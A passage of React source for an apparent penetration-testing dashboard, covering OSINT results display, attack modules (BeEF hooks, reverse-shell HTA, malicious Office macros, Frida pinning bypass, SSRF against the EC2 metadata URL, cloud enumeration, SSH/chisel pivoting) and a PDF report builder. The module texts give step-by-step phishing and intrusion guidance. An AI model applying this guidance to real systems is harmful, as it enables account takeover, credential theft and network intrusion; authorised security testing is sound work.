            <input style={C.input} value={abKey} onChange={e=>setAbKey(e.target.value)} placeholder="AbuseIPDB key" type="password" autoComplete="off" name="ab-api-key" data-form-type="other"/>
          </div>
        </div>
        <div style={{display:"flex",gap:10,alignItems:"center",marginTop:10}}>
          <button style={C.btn} onClick={runAll} disabled={running||!target.trim()} >
            {running ? `Running... ${progress}%` : "Run All OSINT Tools"}
          </button>
          {Object.keys(results).length>0 && !running && (
            <button style={{...C.btn,background:"#ef4444",marginTop:0}} onClick={()=>generateOsintPdf(results,target)}>
              📄 Report
            </button>
          )}
        </div>
        {running && (
          <div style={{marginTop:10,background:"#0f172a",borderRadius:6,padding:8,maxHeight:90,overflowY:"auto"}}>
            {log.map((l,i)=><div key={i} style={{fontSize:10,color:"#64748b"}}>{l}</div>)}
          </div>
        )}
      </div>

      {Object.keys(results).length > 0 && (<>

        {/* GeoIP + Threat Summary Row */}
        <div style={C.row}>
          {geo.ip && (
            <div style={{...C.card,flex:1}}>
              <div style={C.secHdr}>🌍 GeoIP / Location</div>
              {[["IP",geo.ip],["Hostname",geo.hostname],["City",geo.city],["Region",geo.region],["Country",geo.country],["ISP",geo.isp],["Org / ASN",geo.org||geo.as_info],["Timezone",geo.timezone],["Coordinates",geo.loc]].filter(([,v])=>v).map(([k,v])=>(
                <div key={k} style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
                  <span style={C.gray}>{k}</span><span style={C.val}>{v}</span>
                </div>
              ))}
            </div>
          )}
          {(vt.total_engines||vt.error) && (
            <div style={{...C.card,flex:1}}>
              <div style={C.secHdr}>🔴 VirusTotal Reputation</div>
              {vt.error ? <div style={C.red}>{vt.error}</div> : (<>
                <div style={{fontSize:28,fontWeight:900,color:vt.malicious>0?"#ef4444":"#22c55e",marginBottom:8}}>
                  {vt.malicious}/{vt.total_engines} <span style={{fontSize:13,fontWeight:400}}>engines flagged</span>
                </div>
                {[["Malicious",vt.malicious,"#ef4444"],["Suspicious",vt.suspicious,"#f59e0b"],["Harmless",vt.harmless,"#22c55e"]].map(([k,v,c])=>(
                  <div key={k} style={{display:"flex",justifyContent:"space-between",marginBottom:3}}>
                    <span style={C.gray}>{k}</span><span style={{color:c,fontWeight:700}}>{v}</span>
                  </div>
                ))}
                {vt.categories?.length>0 && <div style={{marginTop:8}}>{vt.categories.map((c,i)=><span key={i} style={C.tag("#1e3a8a")}>{c}</span>)}</div>}
              </>)}
            </div>
          )}
          {(ab.abuse_score!==undefined||ab.error) && (
            <div style={{...C.card,flex:1}}>
              <div style={C.secHdr}>🚨 AbuseIPDB</div>
              {ab.error ? <div style={C.red}>{ab.error}</div> : (<>
                <div style={{fontSize:28,fontWeight:900,color:ab.abuse_score>25?"#ef4444":ab.abuse_score>0?"#f59e0b":"#22c55e",marginBottom:8}}>
                  {ab.abuse_score}% <span style={{fontSize:13,fontWeight:400}}>confidence score</span>
                </div>
                {[["IP",ab.ip],["Reports",ab.total_reports],["Country",ab.country],["ISP",ab.isp],["Whitelisted",ab.is_whitelisted?"Yes":"No"]].filter(([,v])=>v!==undefined&&v!=="").map(([k,v])=>(
                  <div key={k} style={{display:"flex",justifyContent:"space-between",marginBottom:3}}>
                    <span style={C.gray}>{k}</span><span style={C.val}>{String(v)}</span>
                  </div>
                ))}
              </>)}
            </div>
          )}
        </div>

        {/* Emails */}
        {allEmails.length>0 && (
          <div style={C.card}>
            <div style={C.secHdr}>📧 Email Addresses Found ({allEmails.length})</div>
            <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
              {allEmails.map((e,i)=><span key={i} style={{...C.tag("#1e3a8a"),fontFamily:"monospace"}}>{e}</span>)}
            </div>
          </div>
        )}

        {/* Subdomains / Hosts */}
        {allHosts.length>0 && (
          <div style={C.card}>
            <div style={C.secHdr}>🌐 Subdomains / Hosts Discovered ({allHosts.length})</div>
            <div style={{columns:3,columnGap:12}}>
              {allHosts.map((h,i)=><div key={i} style={{color:"#60a5fa",fontSize:12,marginBottom:3,breakInside:"avoid"}}>{h}</div>)}
            </div>
          </div>
        )}

        {/* Sherlock */}
        {sher.accounts_found && (
          <div style={C.card}>
            <div style={C.secHdr}>🔎 Social Media Accounts — Sherlock ({sher.total} found for "{sher.username}")</div>
            {sher.total===0 ? <div style={C.gray}>No accounts found for this username.</div> : (
              <div style={{columns:2,columnGap:12}}>
                {sher.accounts_found.map((a,i)=>(
                  <div key={i} style={{marginBottom:4,breakInside:"avoid"}}>
                    <a href={a} target="_blank" rel="noreferrer" style={{color:"#34d399",fontSize:12,textDecoration:"none"}}>{a}</a>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* HaveIBeenPwned */}
        {results.hibp?.checked && (
          <div style={C.card}>
            <div style={C.secHdr}>🔓 HaveIBeenPwned — Data Breaches</div>
            {results.hibp.error ? <div style={C.red}>{results.hibp.error}</div> :
             results.hibp.breaches?.length>0 ? (<>
              <div style={{...C.tag("#ef4444"),marginBottom:10,fontSize:13}}>{results.hibp.breaches.length} BREACH(ES) FOUND</div>
              <div style={{display:"flex",flexWrap:"wrap",gap:6,marginTop:8}}>
                {results.hibp.breaches.map((b,i)=><span key={i} style={C.tag("#7f1d1d")}>{b}</span>)}
              </div>
            </>) : <div style={C.green}>No breaches found for this domain</div>}
          </div>
        )}

        {/* DNSTwist */}
        {results.dnstwist?.domains?.length>0 && (
          <div style={C.card}>
            <div style={C.secHdr}>🎣 DNSTwist — Potential Phishing Domains ({results.dnstwist.domains.length} found)</div>
            <div style={{overflowX:"auto"}}>
              <table style={{width:"100%",borderCollapse:"collapse",fontSize:11}}>
                <thead><tr style={{background:"#1e293b"}}>
                  {["Domain","Type","IP","Registered"].map(h=><th key={h} style={{padding:"5px 8px",color:"#94a3b8",textAlign:"left",fontWeight:700}}>{h}</th>)}
                </tr></thead>
                <tbody>
                  {results.dnstwist.domains.slice(0,30).map((d,i)=>(
                    <tr key={i} style={{background:i%2===0?"#0f172a":"#1e293b"}}>
                      <td style={{padding:"4px 8px",color:"#60a5fa"}}>{d.domain}</td>
                      <td style={{padding:"4px 8px",color:"#94a3b8"}}>{d.fuzzer}</td>
                      <td style={{padding:"4px 8px",color:"#e2e8f0"}}>{d.dns_a?.[0]||"—"}</td>
                      <td style={{padding:"4px 8px",color:d.dns_a?"#ef4444":"#22c55e"}}>{d.dns_a?"Yes":"No"}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Google Dorks */}
        {results.googledorks?.dorks?.length>0 && (
          <div style={C.card}>
            <div style={C.secHdr}>🔍 Google Dorks — Copy & paste into Google</div>
            {results.googledorks.dorks.map((d,i)=>(
              <div key={i} style={{background:"#1e293b",borderRadius:6,padding:"6px 10px",marginBottom:6,fontFamily:"monospace",fontSize:11,color:"#60a5fa",cursor:"pointer",wordBreak:"break-all"}}
                onClick={()=>window.open("https://www.google.com/search?q="+encodeURIComponent(d),"_blank")}>
                {d}
              </div>
            ))}
          </div>
        )}

        {/* Maltego guide */}
        {malt.guide && (
          <div style={C.card}>
            <div style={C.secHdr}>🕸 Maltego Guide</div>
            <pre style={{color:"#94a3b8",fontSize:11,whiteSpace:"pre-wrap",margin:0}}>{malt.guide}</pre>
          </div>
        )}

        {/* Raw outputs */}
        {[["📧 theHarvester Raw",mail.raw_output],["🕷 SpiderFoot Raw",sf.raw_output],["🔭 Recon-ng Raw",rng.raw_output],["🔎 Sherlock Raw",sher.raw_output]].filter(([,v])=>v).map(([label,raw])=>(
          <details key={label} style={{marginBottom:8}}>
            <summary style={{color:"#475569",fontSize:11,cursor:"pointer",padding:"6px 0"}}>{label}</summary>
            <pre style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:10,color:"#64748b",fontSize:10,whiteSpace:"pre-wrap",maxHeight:200,overflowY:"auto",margin:0}}>{raw}</pre>
          </details>
        ))}

      </>)}
    </div>
  );
}

// ── CLIENT-SIDE ATTACKS ───────────────────────────────────────
function ClientSideModule({token, apiUrl}) {
  const attacks = [
    {id:"beef", label:"BeEF Hook", icon:"🪝", ep:"/api/client/beef",
     desc:"Start BeEF XSS framework + JavaScript hook snippet",
     howto:"Fill LHOST (your Kali IP). BeEF starts on port 3000. Inject the hook.js URL into a website with XSS vulnerability, or send the hook URL directly via phishing. Every browser that loads it gets hooked.",
     requires:"LHOST set + Kali with BeEF (apt install beef-xss). Target website with XSS vulnerability OR direct browser access.",
     target_type:"Web applications with XSS vulnerability + end users (browsers)",
     vulns:["Reflected/Stored XSS vulnerability","Browser exploitation","Session hijacking","Internal network scanning from browser","Keylogging via browser","Webcam/microphone access"],
     hackerImpact:"Once hooked, attacker can steal session cookies (account takeover), scan victim's internal network, exploit browser vulnerabilities, take screenshots, or use victim's browser as a proxy into their corporate network."},
    {id:"hta_payload", label:"HTA Payload", icon:"📄", ep:"/api/client/hta_payload",
     desc:"HTML Application file that spawns reverse shell",
     howto:"Fill LHOST and LPORT. Generates a .hta file. Host it on Kali HTTP server, send link to victim via phishing email. When victim opens the link, HTA runs silently and connects back to your listener.",
     requires:"LHOST + LPORT set + nc listener running",
     target_type:"Windows users who receive phishing emails",
     vulns:["Windows allows .hta execution by default","No application whitelisting","Users click on email links","Missing email attachment filtering"],
     hackerImpact:"User receives email: 'Click here to view your invoice'. Clicking opens HTA file in Windows MSHTA.exe. Attacker gets command shell instantly. HTA bypasses many email filters because it's not a traditional executable."},
    {id:"macro", label:"Office Macro", icon:"📊", ep:"/api/client/macro",
     desc:"Malicious VBA macro for Word/Excel document",
     howto:"Fill LHOST and LPORT. Generates VBA macro code. Open Word → Developer → Visual Basic → paste macro → save as .doc. Attach to phishing email as 'invoice.doc' or 'salary_review.doc'.",
     requires:"LHOST + LPORT set + nc/metasploit listener",
     target_type:"Windows users with Microsoft Office — employees, executives",
     vulns:["Office macros enabled by Group Policy","Users bypass security warnings","No email attachment sandboxing","Macro auto-execution (AutoOpen, Workbook_Open)"],
     hackerImpact:"#1 malware delivery method. Ransomware groups (Emotet, Ryuk, Conti) all used Office macros as first stage. User opens document, clicks 'Enable Content', attacker gets shell. From that shell: lateral movement, ransomware deployment, data exfiltration."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="LHOST" value={opts.lhost||""} onChange={e=>setOpts(p=>({...p,lhost:e.target.value}))}
      style={{width:140,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="LPORT" value={opts.lport||"4444"} onChange={e=>setOpts(p=>({...p,lport:e.target.value}))}
      style={{width:90,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Client-Side Attacks" icon="💻" color="#e11d48" desc="Browser exploitation with BeEF, HTA payloads, malicious Office macro VBA generation" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── MOBILE TESTING ────────────────────────────────────────────
function MobileModule({token, apiUrl}) {
  const attacks = [
    {id:"apk_info", label:"APK Analysis", icon:"📱", ep:"/api/mobile/apk_info",
     desc:"aapt + apktool — metadata and AndroidManifest",
     howto:"Download target APK from Play Store using apk-dl.com or pull from device: adb pull /data/app/com.app/base.apk /tmp/app.apk. Enter APK path in filepath field. Analyzes metadata, permissions, activities, and services.",
     requires:"APK file at known path + apktool installed (apt install apktool)",
     target_type:"Android mobile applications — banking apps, corporate apps, any APK",
     vulns:["Exported activities (no permission check)","Backup allowed","Debuggable flag enabled","Weak network security config","Plaintext traffic allowed"],
     hackerImpact:"Exported activities can be launched by other apps without permission — attacker installs malicious app that triggers sensitive functionality. Debuggable apps can be attached with debugger for runtime manipulation."},
    {id:"decompile", label:"Decompile APK", icon:"🔍", ep:"/api/mobile/decompile",
     desc:"jadx — decompile to Java source code",
     howto:"Enter APK path in filepath field. jadx converts .dex bytecode back to readable Java source. Search decompiled code for: hardcoded API keys, passwords, secret keys, SQL queries, encryption keys.",
     requires:"APK file + jadx installed (apt install jadx)",
     target_type:"Android apps — especially financial, healthcare, enterprise apps",
     vulns:["Hardcoded API keys in source code","Hardcoded credentials (username/password)","Insecure cryptography (MD5, DES)","SQLite database with sensitive data","Unencrypted local storage"],
     hackerImpact:"Banking app with hardcoded API key → attacker uses key to make unlimited transactions. Healthcare app with hardcoded admin password → access to all patient records. These are real vulnerabilities found in real apps."},
    {id:"permissions", label:"Permission Audit", icon:"🔐", ep:"/api/mobile/permissions",
     desc:"Flag dangerous Android permissions",
     howto:"Enter APK path in filepath field. Lists all permissions the app requests. CRITICAL permissions like READ_SMS, RECORD_AUDIO, ACCESS_FINE_LOCATION should be justified by app functionality.",
     requires:"APK file at known path",
     target_type:"Any Android application",
     vulns:["READ_SMS → OTP stealing","RECORD_AUDIO → microphone surveillance","ACCESS_FINE_LOCATION → tracking","READ_CONTACTS → data harvesting","RECEIVE_SMS → intercept 2FA codes"],
     hackerImpact:"Malicious app requesting SMS permission can silently steal 2FA codes. Location permission = track victim's physical location. Attackers disguise spyware as useful apps (flashlight, calculator) to collect permissions."},
    {id:"frida_script", label:"Frida Scripts", icon:"💉", ep:"/api/mobile/frida_script",
     desc:"SSL pinning bypass + root detection bypass",
     howto:"Install target app on Android device/emulator. Install Frida: pip install frida-tools. Enter package name (e.g. com.bank.app). Run: frida -U -f com.bank.app -l script.js. Bypasses SSL cert pinning to intercept traffic.",
     requires:"Android device/emulator + Frida server on device + package name",
     target_type:"iOS/Android apps with certificate pinning or root detection",
     vulns:["SSL certificate pinning (can be bypassed)","Root detection bypass","Biometric authentication bypass","Anti-debugging bypass","Runtime method hooking"],
     hackerImpact:"Banking apps implement SSL pinning to prevent traffic interception. Frida bypasses it — attacker intercepts all API calls between app and server, capturing tokens, credentials, and transaction data in plaintext."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="APK path (/tmp/app.apk)" value={opts.apk_path||""} onChange={e=>setOpts(p=>({...p,apk_path:e.target.value}))}
      style={{flex:1,minWidth:220,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="Package name" value={opts.package_name||""} onChange={e=>setOpts(p=>({...p,package_name:e.target.value}))}
      style={{width:180,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Mobile App Testing" icon="📱" color="#0d9488" desc="Android APK analysis, jadx decompilation, permission audit, Frida SSL/root bypass scripts" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── API SECURITY ──────────────────────────────────────────────
function ApiSecModule({token, apiUrl}) {
  const attacks = [
    {id:"swagger", label:"OpenAPI Discovery", icon:"📋", ep:"/api/apisec/swagger",
     desc:"Fetch /swagger.json, /openapi.json, /api-docs",
     howto:"Enter API base URL as target (e.g. https://api.company.com). Automatically fetches Swagger/OpenAPI spec from common paths. Reveals all API endpoints, methods, parameters, and authentication schemes.",
     requires:"Target API URL accessible from Kali",
     target_type:"REST APIs, microservices, mobile app backends, web application APIs",
     vulns:["Public Swagger UI in production","API documentation exposing internal paths","Undocumented admin endpoints","Authentication requirements documented but not enforced"],
     hackerImpact:"Swagger exposed in production gives attacker a complete map of every API endpoint. Admin endpoints like /api/admin/users often discovered this way. Attacker uses the map to test each endpoint systematically."},
    {id:"fuzz", label:"Endpoint Fuzzing", icon:"💥", ep:"/api/apisec/fuzz",
     desc:"ffuf — brute-force hidden API endpoints",
     howto:"Enter API base URL as target (e.g. https://api.company.com/api/v1). ffuf tries thousands of common API paths. Look for 200 (found), 301 (redirect), 403 (forbidden but exists) responses.",
     requires:"ffuf installed (Kali: apt install ffuf) + target API URL",
     target_type:"Any REST API or web application",
     vulns:["Hidden admin endpoints (/api/admin, /api/internal)","Debug endpoints left in production","Undocumented v1/v2 API versions","Health check endpoints leaking system info"],
     hackerImpact:"/api/admin/dump returns all user data. /api/debug shows stack traces with credentials. /api/v1/users returns all users without auth. Hidden endpoints often have weaker security than documented ones."},
    {id:"arjun", label:"Parameter Hunt", icon:"🔍", ep:"/api/apisec/arjun",
     desc:"arjun — discover hidden GET/POST parameters",
     howto:"Enter API endpoint URL as target. Arjun discovers hidden parameters by trying thousands of common names (id, user_id, admin, debug, test, internal). Hidden params often bypass security controls.",
     requires:"arjun installed (pip3 install arjun) + target endpoint URL",
     target_type:"Web APIs, REST endpoints, GraphQL endpoints",
     vulns:["Hidden debug parameter enabling verbose output","id parameter allowing IDOR","admin=true parameter granting elevated access","Internal parameter bypassing rate limiting"],
     hackerImpact:"API has hidden ?debug=true parameter that returns full stack trace with database credentials. Hidden ?admin=1 parameter grants admin access. These are found in real penetration tests frequently."},
    {id:"auth_test", label:"Auth Testing", icon:"🔑", ep:"/api/apisec/auth_test",
     desc:"Missing auth, expired JWT, IDOR on API endpoints",
     howto:"Enter API endpoint URL as target. Optionally add your JWT token. Tests: accessing endpoint without token, with tampered token, checking if admin endpoints require auth. Also tests IDOR by modifying IDs.",
     requires:"Target API URL. Optional: valid JWT token for authenticated tests",
     target_type:"Any REST API with authentication",
     vulns:["Missing authentication on sensitive endpoints","JWT signature not verified (alg:none attack)","IDOR — accessing other users' data by changing ID","Broken object level authorization (BOLA)","Mass assignment vulnerability"],
     hackerImpact:"API endpoint /api/users/123/profile returns data without authentication. Attacker changes 123 to other numbers — accesses all user profiles (IDOR/BOLA). OWASP #1 API vulnerability. Affected Facebook, Instagram, T-Mobile, Venmo."},
  ];
  const extra = (opts,setOpts) => (
    <input placeholder="Auth token (optional)" value={opts.token||""} onChange={e=>setOpts(p=>({...p,token:e.target.value}))}
      style={{width:220,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  );
  return <ModuleShell title="API Security Testing" icon="🔌" color="#2563eb" desc="OpenAPI discovery, ffuf endpoint fuzzing, arjun parameter discovery, auth bypass testing" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}


// ── PIVOTING & LATERAL MOVEMENT ───────────────────────────────
function PivotModule({token, apiUrl}) {
  const attacks = [
    {id:"ssh_local", label:"SSH Local Port Forward", icon:"🔀", ep:"/api/pivot/ssh_local",
     desc:"Forward remote port to localhost via SSH tunnel",
     howto:"Target = compromised SSH host (user@ip). Set remote_port (e.g. 3306 for MySQL) and local_port (e.g. 13306). SSH tunnel binds remote port to your local machine so you can attack internal services.",
     requires:"SSH access to pivot host (username + password or key)",
     target_type:"Internal networks behind firewall, segmented environments",
     vulns:["Exposed internal database reachable via pivot","Internal RDP/SMB accessible through tunnel","Internal admin panels behind firewall"],
     hackerImpact:"Attacker compromises web server. Internal MySQL on 192.168.1.100:3306 not reachable from internet. SSH local forward: localhost:13306 → pivot:3306. Now attacker runs sqlmap against localhost:13306."},
    {id:"ssh_dynamic", label:"SSH SOCKS5 Proxy", icon:"🧅", ep:"/api/pivot/ssh_dynamic",
     desc:"Dynamic SOCKS5 proxy through SSH — route all traffic via pivot",
     howto:"Target = compromised SSH host. Creates SOCKS5 proxy on localhost:1080. Configure proxychains or browser to use 127.0.0.1:1080 as proxy. All traffic routes through pivot into internal network.",
     requires:"SSH access to pivot host",
     target_type:"Full internal network access after compromise",
     vulns:["Full internal subnet access","Attack internal hosts not reachable from internet","Browse internal web apps via browser proxy"],
     hackerImpact:"Single compromised DMZ host becomes gateway to entire internal network. Attacker sets Firefox proxy to localhost:1080 and browses internal SharePoint, Jenkins, admin panels — all via one SSH command."},
    {id:"chisel", label:"Chisel Reverse Tunnel", icon:"⛏️", ep:"/api/pivot/chisel",
     desc:"Chisel — fast HTTP tunnel when SSH not available",
     howto:"Run chisel server on your Kali. Target host runs chisel client. Creates reverse tunnel so Kali can reach internal network. Useful when target has no SSH but has HTTP/S outbound.",
     requires:"chisel binary on both Kali and target (apt install chisel or download from GitHub)",
     target_type:"Targets with outbound HTTP only, Windows hosts without SSH",
     vulns:["Internal network access via HTTP tunnel","Bypasses egress filtering","Works through proxies and CDNs"],
     hackerImpact:"Target company blocks all outbound SSH/VPN. Chisel tunnels over port 443 (HTTPS). Security team sees normal HTTPS traffic. Attacker reaches entire internal network. Used in real APT campaigns."},
    {id:"proxychains", label:"Proxychains Config", icon:"⛓️", ep:"/api/pivot/proxychains",
     desc:"Generate proxychains config for multi-hop pivoting",
     howto:"Enter target SOCKS proxy details. Generates /etc/proxychains4.conf and usage commands. Allows nmap, curl, metasploit to route through your pivot chain.",
     requires:"SOCKS proxy running (SSH dynamic or chisel)",
     target_type:"Any tool that needs to pivot through compromised host",
     vulns:["nmap through pivot","Metasploit through pivot","Credential spraying internal services"],
     hackerImpact:"Chain 3 compromised hosts: Kali → DMZ server → internal server → domain controller. Each hop adds a layer. Defenders can't trace attack back to attacker. Real APT groups use multi-hop pivoting."},
    {id:"ligolo", label:"Ligolo-ng Setup", icon:"🌐", ep:"/api/pivot/ligolo",
     desc:"Ligolo-ng — kernel-level tunneling, fastest pivot tool",
     howto:"Ligolo creates a TUN interface on Kali that routes directly to internal network. No proxychains needed — use tools natively. Target agent connects to Kali listener.",
     requires:"ligolo-ng proxy on Kali + agent on target (download from GitHub releases)",
     target_type:"Complex internal networks, OSCP exam pivoting",
     vulns:["Full Layer 3 network access","No proxychains needed — native tool support","Fastest pivot method available"],
     hackerImpact:"Fastest pivot tool. OSCP students use this on exam. Creates real network interface — you can run nmap, metasploit, browser natively against internal 10.x.x.x subnet with zero proxy overhead."},
  ];
  return <ModuleShell title="Pivoting & Lateral Movement" icon="🔄" color="#7c3aed" desc="SSH tunnels, SOCKS proxies, chisel, ligolo-ng — move through internal networks after initial compromise" token={token} apiUrl={apiUrl} attacks={attacks} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── CLOUD SECURITY ─────────────────────────────────────────────
function CloudModule({token, apiUrl}) {
  const attacks = [
    {id:"s3_enum", label:"S3 Bucket Enumeration", icon:"🪣", ep:"/api/cloud/s3_enum",
     desc:"Find exposed S3 buckets — list, read, write permissions",
     howto:"Enter company name or domain as target. Tool generates common bucket names (company-backup, company-dev, company-prod) and checks AWS S3 for public access. Reads content of open buckets.",
     requires:"AWS CLI or curl. No credentials needed for public buckets.",
     target_type:"Any company using AWS S3 for storage",
     vulns:["Public bucket with sensitive files","World-readable bucket with PII","World-writable bucket (upload malware)","Bucket listing enabled (directory traversal)"],
     hackerImpact:"Company named 'acme' → check acme-backup.s3.amazonaws.com. File backup.sql found — full database dump with customer PII and password hashes. Capital One breach ($80M fine) happened this way."},
    {id:"aws_enum", label:"AWS Metadata / SSRF", icon:"☁️", ep:"/api/cloud/aws_enum",
     desc:"EC2 metadata endpoint — steal IAM credentials via SSRF",
     howto:"Target = URL of web app with SSRF vulnerability. Tool tests if app fetches http://169.254.169.254/latest/meta-data/iam/security-credentials/. This URL returns temporary AWS keys if vulnerable.",
     requires:"Web app with SSRF vulnerability (found via SSRF scanner)",
     target_type:"AWS EC2 instances running web applications",
     vulns:["IMDSv1 enabled — no auth required","IAM role credentials stolen","AWS account takeover via temporary keys"],
     hackerImpact:"SSRF in profile picture URL → fetches 169.254.169.254 → gets IAM keys → attacker has full AWS account access. Capital One, Netflix, Twitch all had similar exposures. AWS now recommends IMDSv2."},
    {id:"azure_enum", label:"Azure AD Enumeration", icon:"🔷", ep:"/api/cloud/azure_enum",
     desc:"Enumerate Azure AD users, apps, permissions without auth",
     howto:"Enter target domain (e.g. company.com) as target. Checks Azure AD login endpoint for valid users (user enumeration), lists public apps, checks for common misconfigs.",
     requires:"Domain name. No Azure credentials needed for initial enum.",
     target_type:"Organizations using Microsoft 365, Azure AD, Entra ID",
     vulns:["Azure AD user enumeration without auth","Public app registrations exposing internal tools","Guest access enabled on sensitive resources"],
     hackerImpact:"company.com → enumerate Azure AD → find valid usernames → password spray → gain access to M365, Teams, SharePoint, internal apps. 85% of enterprises use Azure AD — high-value target."},
    {id:"gcp_enum", label:"GCP Bucket & IAM", icon:"🔵", ep:"/api/cloud/gcp_enum",
     desc:"Google Cloud Storage buckets + IAM misconfiguration check",
     howto:"Enter company name or GCS bucket name as target. Checks for public GCS buckets, allUsers permissions, IAM bindings that allow unauthenticated access.",
     requires:"curl or gsutil CLI",
     target_type:"Companies using Google Cloud Platform",
     vulns:["Public GCS bucket with sensitive data","allUsers IAM binding (world-readable)","Compute Engine metadata accessible","Service account key files exposed in bucket"],
     hackerImpact:"GCS bucket company-data open to allUsers → contains service account JSON keys → attacker authenticates to GCP with Owner role → full cloud infrastructure access."},
  ];
  return <ModuleShell title="Cloud Security Testing" icon="☁️" color="#0891b2" desc="AWS S3 enumeration, SSRF metadata attacks, Azure AD enumeration, GCP bucket misconfigurations" token={token} apiUrl={apiUrl} attacks={attacks} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── REPORT WRITING ─────────────────────────────────────────────
function ReportModule({token, apiUrl}) {
  const [findings, setFindings] = useState([]);
  const [title, setTitle]       = useState("Penetration Test Report");
  const [tester, setTester]     = useState("");
  const [client, setClient]     = useState("");
  const [target, setTarget]     = useState("");
  const [exec,   setExec]       = useState("");
  const [extra,  setExtra]      = useState([]);
  const [loading,setLoading]    = useState(false);

  const sev = {CRITICAL:"#ef4444",HIGH:"#f97316",MEDIUM:"#f59e0b",LOW:"#22c55e",INFO:"#60a5fa"};

  const addFinding = () => setFindings(p=>[...p,{title:"",severity:"HIGH",desc:"",remediation:""}]);
  const updF = (i,k,v) => setFindings(p=>p.map((f,idx)=>idx===i?{...f,[k]:v}:f));
  const delF = i => setFindings(p=>p.filter((_,idx)=>idx!==i));

  const exportPDF = () => {
    const doc = new jsPDF({unit:"mm",format:"a4"});
    const W=210, M=14, CW=W-M*2;
    let y=15;
    const nl = (h=6)=>{ y+=h; if(y>280){doc.addPage();y=15;} };
    const txt = (t,x,yy,sz=10,c=[30,30,30],bold=false)=>{
      doc.setFontSize(sz); doc.setTextColor(...c);
      if(bold) doc.setFont("helvetica","bold"); else doc.setFont("helvetica","normal");
      doc.text(String(t),x,yy);
    };
    const box = (x,yy,w,h,c)=>{ doc.setFillColor(...c); doc.rect(x,yy,w,h,"F"); };

    // Cover
    box(0,0,W,50,[15,23,42]);
    txt(title,M,20,18,[255,255,255],true);
    txt(`Client: ${client||"—"}   |   Tester: ${tester||"—"}   |   Target: ${target||"—"}`,M,30,9,[148,163,184]);
    txt(new Date().toLocaleDateString("en-GB",{year:"numeric",month:"long",day:"numeric"}),M,38,9,[100,116,139]);
    y=58;

    // Exec summary
    if(exec){
      box(M,y,CW,8,[30,41,59]); txt("EXECUTIVE SUMMARY",M+3,y+5.5,9,[148,163,184],true); y+=12;
      doc.setFontSize(9); doc.setTextColor(60,60,60); doc.setFont("helvetica","normal");
      const lines=doc.splitTextToSize(exec,CW); doc.text(lines,M,y); y+=lines.length*5+6;
    }

    // Risk summary
    const cnt={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
    findings.forEach(f=>{ if(cnt[f.severity]!==undefined) cnt[f.severity]++; });
    box(M,y,CW,8,[30,41,59]); txt("RISK SUMMARY",M+3,y+5.5,9,[148,163,184],true); y+=12;
    Object.entries(cnt).forEach(([s,n])=>{
      const col=s==="CRITICAL"?[239,68,68]:s==="HIGH"?[249,115,22]:s==="MEDIUM"?[245,158,11]:s==="LOW"?[34,197,94]:[96,165,250];
      box(M,y,30,6,col); txt(s,M+2,y+4.5,8,[255,255,255],true);
      txt(String(n),M+33,y+4.5,10,[30,30,30],true); y+=8;
    });
    y+=4;

    // Findings
    box(M,y,CW,8,[30,41,59]); txt("FINDINGS",M+3,y+5.5,9,[148,163,184],true); y+=12;
    findings.forEach((f,i)=>{
      if(y>260){doc.addPage();y=15;}
      const col=f.severity==="CRITICAL"?[239,68,68]:f.severity==="HIGH"?[249,115,22]:f.severity==="MEDIUM"?[245,158,11]:f.severity==="LOW"?[34,197,94]:[96,165,250];
      box(M,y,4,14,col);
      txt(`${i+1}. ${f.title||"Untitled Finding"}`,M+7,y+5,11,[15,23,42],true);
      txt(f.severity,M+7,y+11,8,col,true); y+=17;
      if(f.desc){
        doc.setFontSize(9); doc.setTextColor(60,60,60); doc.setFont("helvetica","normal");
        const dl=doc.splitTextToSize(f.desc,CW-4); doc.text(dl,M+4,y); y+=dl.length*5+3;
      }
      if(f.remediation){
        txt("Remediation:",M+4,y,9,[34,197,94],true); y+=5;
        doc.setFontSize(8); doc.setTextColor(80,80,80);
        const rl=doc.splitTextToSize(f.remediation,CW-4); doc.text(rl,M+4,y); y+=rl.length*4.5+6;
      }
      doc.setDrawColor(220,220,220); doc.line(M,y,M+CW,y); y+=4;
    });

    doc.save(`pentest_${_pdfFn(target)}_${_pdfDt()}.pdf`);
  };

  const SEVS = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"];
  return (
    <div style={{padding:24,maxWidth:900,margin:"0 auto"}}>
      <div style={{marginBottom:20}}>
        <h2 style={{color:"#e2e8f0",margin:0,fontSize:22,fontWeight:800}}>📄 Report Writing</h2>
        <p style={{color:"#64748b",fontSize:13,marginTop:6}}>Build your penetration test report, add findings, and export a professional PDF.</p>
      </div>

      {/* Report metadata */}
      <div style={{background:"#0a1628",border:"1px solid #1e293b",borderRadius:10,padding:18,marginBottom:16}}>
        <div style={{color:"#60a5fa",fontWeight:700,fontSize:12,marginBottom:12,letterSpacing:1}}>REPORT DETAILS</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
